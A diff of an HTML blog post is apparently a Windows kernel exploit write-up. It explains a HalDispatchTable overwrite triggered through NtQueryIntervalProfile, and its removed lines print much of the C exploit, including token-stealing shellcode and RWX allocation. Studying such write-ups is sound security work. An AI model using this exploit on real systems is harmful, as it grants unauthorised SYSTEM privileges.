-	<span class="n">pHalIoWritePartitionTable</span> <span class="n">HalIoWritePartitionTable</span><span class="p">;</span>
-	<span class="n">pHalHandlerForBus</span> <span class="n">HalReferenceHandlerForBus</span><span class="p">;</span>
-	<span class="n">pHalReferenceBusHandler</span> <span class="n">HalReferenceBusHandler</span><span class="p">;</span>
-	<span class="n">pHalReferenceBusHandler</span> <span class="n">HalDereferenceBusHandler</span><span class="p">;</span>
-	<span class="n">pHalInitPnpDriver</span> <span class="n">HalInitPnpDriver</span><span class="p">;</span>
-	<span class="n">pHalInitPowerManagement</span> <span class="n">HalInitPowerManagement</span><span class="p">;</span>
-	<span class="n">pHalGetDmaAdapter</span> <span class="n">HalGetDmaAdapter</span><span class="p">;</span>
-	<span class="n">pHalGetInterruptTranslator</span> <span class="n">HalGetInterruptTranslator</span><span class="p">;</span>
-	<span class="n">pHalStartMirroring</span> <span class="n">HalStartMirroring</span><span class="p">;</span>
-	<span class="n">pHalEndMirroring</span> <span class="n">HalEndMirroring</span><span class="p">;</span>
-	<span class="n">pHalMirrorPhysicalMemory</span> <span class="n">HalMirrorPhysicalMemory</span><span class="p">;</span>
-	<span class="n">pHalEndOfBoot</span> <span class="n">HalEndOfBoot</span><span class="p">;</span>
-	<span class="n">pHalMirrorVerify</span> <span class="n">HalMirrorVerify</span><span class="p">;</span>
-	<span class="n">pHalGetAcpiTable</span> <span class="n">HalGetCachedAcpiTable</span><span class="p">;</span>
-	<span class="n">pHalSetPciErrorHandlerCallback</span>  <span class="n">HalSetPciErrorHandlerCallback</span><span class="p">;</span>
-<span class="cp">#if defined(_IA64_)
-</span><span class="n">pHalGetErrorCapList</span> <span class="n">HalGetErrorCapList</span><span class="p">;</span>
-	<span class="n">pHalInjectError</span> <span class="n">HalInjectError</span><span class="p">;</span>
-<span class="cp">#endif
-</span><span class="p">}</span> <span class="n">HAL_DISPATCH</span><span class="p">,</span> <span class="o">*</span><span class="n">PHAL_DISPATCH</span><span class="p">;</span>
-</code></pre></div></div>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; dq nt!HalDispatchTable
+</code></pre><p>We can see that if we call <code>NtQueryIntervalProfile</code> in ring3, Windows will call
+<code>KeQueryIntervalProfile</code> in ring0 and the function pointed by
+<code>nt!HalDispatchTable+0x8</code>! But what is <code>HalDispatchTable</code>? ReactOS will help us:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">ULONG</span> <span class="n">Version</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalQuerySystemInformation</span> <span class="n">HalQuerySystemInformation</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalSetSystemInformation</span> <span class="n">HalSetSystemInformation</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalQueryBusSlots</span> <span class="n">HalQueryBusSlots</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">ULONG</span> <span class="n">Spare1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalExamineMBR</span> <span class="n">HalExamineMBR</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#if 1 </span><span class="cm">/* Not present in WDK 7600 */</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="n">pHalIoAssignDriveLetters</span> <span class="n">HalIoAssignDriveLetters</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="n">pHalIoReadPartitionTable</span> <span class="n">HalIoReadPartitionTable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalIoSetPartitionInformation</span> <span class="n">HalIoSetPartitionInformation</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalIoWritePartitionTable</span> <span class="n">HalIoWritePartitionTable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalHandlerForBus</span> <span class="n">HalReferenceHandlerForBus</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalReferenceBusHandler</span> <span class="n">HalReferenceBusHandler</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalReferenceBusHandler</span> <span class="n">HalDereferenceBusHandler</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalInitPnpDriver</span> <span class="n">HalInitPnpDriver</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalInitPowerManagement</span> <span class="n">HalInitPowerManagement</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalGetDmaAdapter</span> <span class="n">HalGetDmaAdapter</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalGetInterruptTranslator</span> <span class="n">HalGetInterruptTranslator</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalStartMirroring</span> <span class="n">HalStartMirroring</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalEndMirroring</span> <span class="n">HalEndMirroring</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalMirrorPhysicalMemory</span> <span class="n">HalMirrorPhysicalMemory</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalEndOfBoot</span> <span class="n">HalEndOfBoot</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalMirrorVerify</span> <span class="n">HalMirrorVerify</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalGetAcpiTable</span> <span class="n">HalGetCachedAcpiTable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalSetPciErrorHandlerCallback</span>  <span class="n">HalSetPciErrorHandlerCallback</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#if defined(_IA64_)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">pHalGetErrorCapList</span> <span class="n">HalGetErrorCapList</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pHalInjectError</span> <span class="n">HalInjectError</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="p">}</span> <span class="n">HAL_DISPATCH</span><span class="p">,</span> <span class="o">*</span><span class="n">PHAL_DISPATCH</span><span class="p">;</span>
+</span></span></code></pre></div><pre tabindex="0"><code>kd&gt; dq nt!HalDispatchTable
 fffff800`027f5c60  00000000`00000004 fffff800`02c268e8
 fffff800`027f5c70  fffff800`02c27470 fffff800`029f2d60
 fffff800`027f5c80  00000000`00000000 fffff800`026cacb0
@@ -255,41 +245,32 @@ kd&gt; u poi(nt!HalDispatchTable+0x8)
 fffff800`02c268e8 fff3            push    rbx
 fffff800`02c268ea 55              push    rbp
 [...]
-</code></pre></div></div>
-
-<p>We can see that at <code class="highlighter-rouge">HalDispatchTable+0x8</code> store a pointer to 
-<code class="highlighter-rouge">HalQuerySystemInformation</code>. Therefore, we just need to modify 
-<code class="highlighter-rouge">HalDispatchTable+0x8</code> to point to our shellcode and call 
-<code class="highlighter-rouge">NtQueryIntervalProfile</code> to execute our shellcode in ring0. Fortunely for us, 
-<code class="highlighter-rouge">HalDispatchTable</code> is exported by name by <code class="highlighter-rouge">ntoskrnl.exe</code>, so we can found this 
+</code></pre><p>We can see that at <code>HalDispatchTable+0x8</code> store a pointer to
+<code>HalQuerySystemInformation</code>. Therefore, we just need to modify
+<code>HalDispatchTable+0x8</code> to point to our shellcode and call
+<code>NtQueryIntervalProfile</code> to execute our shellcode in ring0. Fortunely for us,
+<code>HalDispatchTable</code> is exported by name by <code>ntoskrnl.exe</code>, so we can found this
 address easily:</p>
-
 <ul>
-  <li>We load <code class="highlighter-rouge">ntoskrnl.exe</code> with <code class="highlighter-rouge">LoadLibrary</code></li>
-  <li>We use <code class="highlighter-rouge">GetProcAddress</code> to find <code class="highlighter-rouge">HalDispatchTable</code> address in userland</li>
-  <li>We search the image base address of <code class="highlighter-rouge">ntoskrnl</code> in kernelland with 
-<code class="highlighter-rouge">NtQuerySystemInformation(SystemModuleInformation)</code></li>
-  <li>And we obtain the final address with a little calculation: <code class="highlighter-rouge">HalDispatchTable</code> 
-userland address - <code class="highlighter-rouge">ntoskrnl</code> userland address + <code class="highlighter-rouge">ntoskrnl</code> image base address 
+<li>We load <code>ntoskrnl.exe</code> with <code>LoadLibrary</code></li>
+<li>We use <code>GetProcAddress</code> to find <code>HalDispatchTable</code> address in userland</li>
+<li>We search the image base address of <code>ntoskrnl</code> in kernelland with
+<code>NtQuerySystemInformation(SystemModuleInformation)</code></li>
+<li>And we obtain the final address with a little calculation: <code>HalDispatchTable</code>
+userland address - <code>ntoskrnl</code> userland address + <code>ntoskrnl</code> image base address
 in kernelland</li>
 </ul>
-
-<p>Finally, we need to replace the address at <code class="highlighter-rouge">HalDispatchTable+0x8</code> with a valid 
-kernel function address to decrease the chances to get a BSOD. I have used 
-<code class="highlighter-rouge">KeGetCurrentThread</code>:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; u nt!KeGetCurrentThread
+<p>Finally, we need to replace the address at <code>HalDispatchTable+0x8</code> with a valid
+kernel function address to decrease the chances to get a BSOD. I have used
+<code>KeGetCurrentThread</code>:</p>
+<pre tabindex="0"><code>kd&gt; u nt!KeGetCurrentThread
 nt!PsGetCurrentThread:
 fffff800`026ca2c0 65488b042588010000 mov   rax,qword ptr gs:[188h]
 fffff800`026ca2c9 c3              ret
-</code></pre></div></div>
-
-<h2 id="final-exploit">Final exploit</h2>
-
-<p>I have used the same shellcode of previous levels to copy the system token in 
+</code></pre><h2 id="final-exploit">Final exploit</h2>
+<p>I have used the same shellcode of previous levels to copy the system token in
 my process.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>E:\&gt;exploit.exe
+<pre tabindex="0"><code>E:\&gt;exploit.exe
 [+] Search address of notskrnl.exe...
 [+] HalDispatchTable in userland: 0x401F0C60
 [+] HalDispatchTable in kernelland: 0x27F1C60
@@ -301,313 +282,299 @@ my process.</p>
 [+] KeGetCurrentThread in userland: 0x400C92C0
 [+] KeGetCurrentThread in kernelland: 0x26CA2C0
 [+] Executing a new command console to test it...
-</code></pre></div></div>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
-#include &lt;winioctl.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-</span>
-<span class="cp">#define IOCTL_WRIT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define DEVICE_NAME "\\\\.\\3"
-</span>
-<span class="k">typedef</span> <span class="k">enum</span> <span class="p">{</span>
-	<span class="n">SystemBasicInformation</span><span class="p">,</span> 
-	<span class="n">SystemProcessorInformation</span><span class="p">,</span> 
-	<span class="n">SystemPerformanceInformation</span><span class="p">,</span> 
-	<span class="n">SystemTimeOfDayInformation</span><span class="p">,</span> 
-	<span class="n">SystemPathInformation</span><span class="p">,</span> 
-	<span class="n">SystemProcessInformation</span><span class="p">,</span> 
-	<span class="n">SystemCallCountInformation</span><span class="p">,</span> 
-	<span class="n">SystemDeviceInformation</span><span class="p">,</span> 
-	<span class="n">SystemProcessorPerformanceInformation</span><span class="p">,</span> 
-	<span class="n">SystemFlagsInformation</span><span class="p">,</span> 
-	<span class="n">SystemCallTimeInformation</span><span class="p">,</span> 
-	<span class="n">SystemModuleInformation</span>
-<span class="p">}</span> <span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_INFORMATION_CLASS</span><span class="p">;</span>
-
-<span class="k">typedef</span> <span class="k">struct</span>
-<span class="p">{</span>
-    <span class="n">PVOID</span> <span class="n">Reserved1</span><span class="p">;</span>
-    <span class="n">PVOID</span> <span class="n">Reserved2</span><span class="p">;</span>
-    <span class="n">PVOID</span> <span class="n">ImageBaseAddress</span><span class="p">;</span>
-    <span class="n">ULONG</span> <span class="n">ImageSize</span><span class="p">;</span>
-    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
-    <span class="n">WORD</span> <span class="n">Id</span><span class="p">;</span>
-    <span class="n">WORD</span> <span class="n">Rank</span><span class="p">;</span>
-    <span class="n">WORD</span> <span class="n">w018</span><span class="p">;</span>
-    <span class="n">WORD</span> <span class="n">NameOffset</span><span class="p">;</span>
-    <span class="n">BYTE</span> <span class="n">Name</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
-<span class="p">}</span> <span class="n">SYSTEM_MODULE</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE</span><span class="p">;</span>
-
-<span class="k">typedef</span> <span class="k">struct</span>
-<span class="p">{</span>
-    <span class="n">ULONG</span> <span class="n">ModulesCount</span><span class="p">;</span>
-    <span class="n">SYSTEM_MODULE</span> <span class="n">Modules</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
-<span class="p">}</span> <span class="n">SYSTEM_MODULE_INFORMATION</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">;</span>
-
-<span class="k">typedef</span> <span class="nf">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQuerySystemInformation</span><span class="p">)(</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">PULONG</span><span class="p">);</span>
-<span class="k">typedef</span> <span class="nf">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtAllocateVirtualMemory</span><span class="p">)(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">PVOID</span><span class="o">*</span><span class="p">,</span> <span class="n">ULONG_PTR</span><span class="p">,</span> <span class="n">PSIZE_T</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">);</span>
-<span class="k">typedef</span> <span class="nf">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQueryIntervalProfile</span><span class="p">)(</span><span class="n">DWORD</span><span class="p">,</span> <span class="n">PULONG</span><span class="p">);</span> 
-
-<span class="k">typedef</span> <span class="k">struct</span>
-<span class="p">{</span>
-    <span class="n">PDWORD64</span> <span class="n">where</span><span class="p">;</span>
-    <span class="n">DWORD64</span> <span class="n">what</span><span class="p">;</span>
-<span class="p">}</span> <span class="n">L33TNESS</span><span class="p">,</span>
-<span class="o">*</span><span class="n">PL33TNESS</span><span class="p">;</span>
-
-
-<span class="n">BYTE</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>  <span class="s">"</span><span class="se">\x53\x51\x52\x57\x56\x6A\xFF\x6A\xFF\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x52\x70\x48\x81\xC2\x88\x01</span><span class="s">"</span>
-                    <span class="s">"</span><span class="se">\x00\x00\x48\x89\xD3\x48\x8B\x42\xF8\x48\x83\xF8\x04\x74\x19\x48\xB9\x41\x41\x41\x41\x41\x41\x41\x41\x48\x39</span><span class="s">"</span>
-                    <span class="s">"</span><span class="se">\xC8\x74\x11\x48\x8B\x12\x48\x39\xDA\x74\x31\xEB\xDD\x48\x89\x54\x24\x08\xEB\x04\x48\x89\x14\x24\x48\xC7\xC1</span><span class="s">"</span>
-                    <span class="s">"</span><span class="se">\xFF\xFF\xFF\xFF\x48\x39\x0C\x24\x74\xDE\x48\x39\x4C\x24\x08\x74\xD7\x5F\x5E\x48\x8B\x86\x80\x00\x00\x00\x48</span><span class="s">"</span>
-                    <span class="s">"</span><span class="se">\x89\x87\x80\x00\x00\x00\x5E\x5F\x5A\x59\x5B\xC3</span><span class="s">"</span><span class="p">;</span>
-
-
-<span class="kt">void</span> <span class="nf">replacePattern</span><span class="p">(</span><span class="kt">char</span> <span class="n">buffer</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">bufferSize</span><span class="p">,</span> <span class="n">DWORD64</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">DWORD64</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">BOOL</span> <span class="n">found</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
-         
-    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">bufferSize</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">PDWORD64</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="n">pattern</span><span class="p">)</span> <span class="p">{</span>
-            <span class="n">found</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
-            <span class="o">*</span><span class="p">(</span><span class="n">PDWORD64</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-         
-    <span class="k">return</span> <span class="n">found</span><span class="p">;</span>
-<span class="p">}</span>                    
-
-<span class="n">PVOID</span> <span class="nf">getKernelBase</span><span class="p">()</span> <span class="p">{</span>
-	<span class="n">PVOID</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-	<span class="n">_NtQuerySystemInformation</span> <span class="n">NtQuerySystemInformation</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-	<span class="n">DWORD</span> <span class="n">sizeInfo</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="n">DWORD</span> <span class="n">error</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">moduleList</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-	<span class="n">PVOID</span> <span class="n">kernelBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-
-	<span class="n">ntdll</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">ntdll</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Can't found ntdll"</span><span class="p">);</span>
-    	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="n">NtQuerySystemInformation</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtQuerySystemInformation"</span><span class="p">);</span>
-
-    <span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sizeInfo</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">sizeInfo</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] NtQuerySystemInformation return 0 for information size</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="n">moduleList</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="n">sizeInfo</span><span class="p">);</span>
-    <span class="n">error</span> <span class="o">=</span> <span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="n">moduleList</span><span class="p">,</span> <span class="n">sizeInfo</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">error</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] NtQuerySystemInformation error: 0x%X (struct size: 0x%X)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">error</span><span class="p">,</span> <span class="n">sizeInfo</span><span class="p">);</span>
-    	<span class="n">free</span><span class="p">(</span><span class="n">moduleList</span><span class="p">);</span>
-    	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="n">kernelBase</span> <span class="o">=</span> <span class="n">moduleList</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">ImageBaseAddress</span><span class="p">;</span>
-    <span class="n">free</span><span class="p">(</span><span class="n">moduleList</span><span class="p">);</span>
-
-	<span class="k">return</span> <span class="n">kernelBase</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">L33TNESS</span> <span class="n">l33t</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-    <span class="n">DWORD</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">PVOID</span> <span class="n">ntoskrnl</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">PVOID</span> <span class="n">originalValue</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">PVOID</span> <span class="n">kernelBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">DWORD</span> <span class="n">error</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">PVOID</span> <span class="n">leetAddress</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
-    <span class="n">DWORD</span> <span class="n">sizeofShellcode</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
-    <span class="n">_NtAllocateVirtualMemory</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">_NtQueryIntervalProfile</span> <span class="n">NtQueryIntervalProfile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">PVOID</span> <span class="n">KeGetCurrentThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">ULONG</span> <span class="n">wtf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">255</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-    <span class="n">DWORD</span> <span class="n">sizeofUsername</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
-    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Search address of notskrnl.exe...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">ntoskrnl</span> <span class="o">=</span> <span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"ntoskrnl.exe"</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">ntoskrnl</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Can't load ntoskrnl.exe</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    	<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntoskrnl</span><span class="p">,</span> <span class="s">"HalDispatchTable"</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">HalDispatchTable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Can't found HalDispatchTable in ntoskrnl.exe</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    	<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] HalDispatchTable in userland: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HalDispatchTable</span><span class="p">);</span>
-
-    <span class="n">kernelBase</span> <span class="o">=</span> <span class="n">getKernelBase</span><span class="p">();</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">kernelBase</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Can't find the kernel base</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    	<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">HalDispatchTable</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">ntoskrnl</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">kernelBase</span><span class="p">;</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] HalDispatchTable in kernelland: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HalDispatchTable</span><span class="p">);</span>
-
-	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Search NtAllocateVirtualMemory...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtAllocateVirtualMemory</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtAllocateVirtualMemory"</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">NtAllocateVirtualMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error with GetProcAddress : %.8x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
-        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
-    <span class="p">}</span>
-   
-    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Copy the shellcode...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">error</span> <span class="o">=</span> <span class="n">NtAllocateVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">leetAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sizeofShellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">error</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error with NtAllocateVirtualMemory : %.8x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">error</span><span class="p">);</span>
-        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="n">GetCurrentProcessId</span><span class="p">());</span> <span class="c1">// Process PID</span>
-    <span class="n">memcpy</span><span class="p">(</span><span class="n">leetAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
-
